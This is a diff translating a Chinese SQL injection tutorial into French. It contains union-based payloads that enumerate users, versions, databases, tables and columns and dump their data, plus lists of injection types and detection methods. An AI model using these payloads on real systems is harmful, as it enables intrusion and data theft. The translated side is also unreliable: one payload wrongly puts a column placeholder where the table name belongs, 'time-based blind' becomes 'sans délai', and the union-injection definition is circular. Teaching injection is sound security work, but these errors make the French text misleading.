@@ -169,74 +169,74 @@ and 1= (select column_name from information_schema.columns where table_name='nom
 ```
  
 
-   -  获取数据：在URL或表单中输入如下语句，看是否能显示数据。 
+   - Obtenir des données : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si les données peuvent être affichées. 
 ```sql
-and 1= (select top 1 列名 from 表名)
-#或
-and 1= (select 列名 from 表名 limit 1)
+and 1= (select top 1 Nom_colonne from Nom_table)
+#ou
+and 1= (select Nom_colonne from Nom_colonne limit 1)
 ```
  
-## 四、SQL注入中的常用命令
+## Commandes courantes dans l'injection SQL
 
-   1.  SQL注入中的常用命令示例： 
-      -  查看当前用户 
+   1) Exemples de commandes courantes utilisées dans l'injection SQL : 
+      - Afficher l'utilisateur actuel 
 ```sql
 union select 1, (select user ())–+
 ```
  
 
-      -  查看数据库版本 
+      - Visualisation de la version de la base de données 
 ```sql
 union select 1, (select version ())–+
 ```
  
 
-      -  查看当前数据库名 
+      - Affichage du nom de la base de données actuelle 
 ```sql
 union select 1, (select database ())–+
 ```
  
 
-      -  查看所有数据库名 
+      - Voir tous les noms de bases de données 
 ```sql
 union select 1, (select group_concat (schema_name) from information_schema.schemata)–+
 ```
  
 
-      -  查看某个数据库的所有表名 
+      - Afficher tous les noms de tables d'une base de données 
 ```sql
-union select 1, (select group_concat (table_name) from information_schema.tables where table_schema='数据库名')–+
+union select 1, (select group_concat (table_name) from information_schema.tables where table_schema='nom de la base de données')–+
 ```
  
 
-      -  查看某个表的所有列名 
+      - Afficher toutes les colonnes d'un tableau 
 ```sql
-union select 1, (select group_concat (column_name) from information_schema.columns where table_name='表名')–+
+union select 1, (select group_concat (column_name) from information_schema.columns where table_name='nom de la table')–+
 ```
  
 
-      -  查看某个列的所有数据 
+      - Afficher toutes les données d'une colonne 
 ```sql
-union select 1, (select group_concat (列名) from 表名)–+
+union select 1, (select group_concat (colonne) from nom_table)–+
 ```
  
 
-## 五、SQL注入的类别
+## V. Catégories d'injection SQL
 
-1. SQL注入的种类有以下几种： 
-   - 联合注入：可以使用union的情况下的注入。
-   - 布尔盲注：不能根据页面返回内容判断任何信息，只能根据条件真假来判断。
-   - 报错注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
-   - 时间盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行来判断。
-   - 堆叠注入：可以同时执行多条语句的执行时的注入。
-   - 二次注入：在数据库中存储了用户的输入，再次执行时触发的注入。
-   - 宽字节注入：利用字符编码的差异，绕过过滤的注入。
-   - Cookie注入：利用Cookie中的参数进行注入
+1) Il existe plusieurs types d'injection SQL : 
+   - Injection d'union : peut être utilisée dans le cas d'une injection d'union.
+   - Injection booléenne aveugle : ne peut pas se baser sur le contenu de la page à retourner pour déterminer une quelconque information, seulement selon les conditions de vrai ou faux pour juger.
+   - Injection d'erreur : la page renvoie un message d'erreur ou les résultats de l'instruction injectée directement dans la page.
+   - Injection sans délai : vous ne pouvez juger d'aucune information sur la base du contenu de la page renvoyée, utilisez l'instruction conditionnelle pour voir si l'instruction de délai est exécutée pour juger.
+   - Injection empilée : il est possible d'exécuter plusieurs instructions en même temps lors de l'exécution de l'injection.
+   - Injection secondaire : injection déclenchée lorsque l'entrée de l'utilisateur est stockée dans la base de données et exécutée à nouveau.
+   - Injection à octets larges : injection qui contourne le filtrage en tirant parti des différences d'encodage des caractères.
+   - Injection par cookie : injection utilisant les paramètres du cookie.
 
-## 六、SQL注入常用的检测方法
+## VI. Méthodes de détection de l'injection SQL couramment utilisées
 
-1. SQL注入常用的检测方法有以下几种： 
-   - 动态检测：通过向数据库发送特殊的SQL语句，观察数据库的响应，判断是否存在SQL注入漏洞。
-   - 静态检测：通过分析程序源代码，找出可能存在SQL注入风险的语句，进行修复或优化。
-   - 插入单、双引号：通过在参数中添加单引号或双引号，看是否出现数据库错误提示，判断是否有注入点。
-   - 使用SQL注入检测工具：例如SQLMap、SQLNinja、Havij等，可以自动化地发现和利用SQL注入漏洞
+1) Il existe plusieurs méthodes de détection de l'injection SQL : 
+   - Détection dynamique : en envoyant des instructions SQL spéciales à la base de données et en observant la réponse de la base de données pour déterminer s'il existe une vulnérabilité d'injection SQL.
+   - Détection statique : en analysant le code source du programme, en identifiant les instructions susceptibles de présenter un risque d'injection SQL et en les réparant ou en les optimisant.
+   - Insertion de guillemets simples ou doubles : en ajoutant des guillemets simples ou doubles aux paramètres, voir s'il y a un message d'erreur de la base de données et juger s'il y a un point d'injection.
+   - Utiliser des outils de détection des injections SQL : tels que SQLMap, SQLNinja, Havij, etc., qui peuvent automatiser la découverte et l'exploitation des vulnérabilités des injections SQL.
